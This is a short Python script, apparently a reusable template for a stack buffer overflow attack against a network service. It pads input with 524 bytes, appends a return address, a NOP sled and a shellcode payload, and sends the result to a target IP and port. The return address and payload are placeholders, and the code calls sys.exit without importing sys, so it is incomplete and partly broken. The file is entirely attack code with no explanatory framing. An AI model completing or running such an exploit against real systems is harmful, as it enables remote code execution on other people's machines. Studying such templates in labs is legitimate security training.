#!/usr/bin/env python3

import pyfiglet
import socket
import argparse

def exploit(ip, port, buffer):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Sending buffer exploit...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
            s.close()
    except socket.error as e:
        print(f"Could not connect to {ip}:{port}")
        print(f"Exception: {str(e)}")
        sys.exit(0)

def main():
    asciiText = "Dynamic Buffer Overflow"
    asciiArt = pyfiglet.figlet_format(asciiText, font='digital')
    print(asciiArt)
    
    parser = argparse.ArgumentParser(description="Dynamic buffer overflow for vulnerable application.")
    parser.add_argument("ip", type=str, help="IP address of target")
    parser.add_argument("port", type=int, help="Port number of target")
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    
    offset = 524
    overflow = "A" * offset
    retn = "return_address_in_endian"
    padding = "\x90" * 16
    payload = ("payload_in_hex")
    
    buffer = overflow + retn + padding + payload
    exploit(ip, port, buffer)

if __name__ == "__main__":
    main()
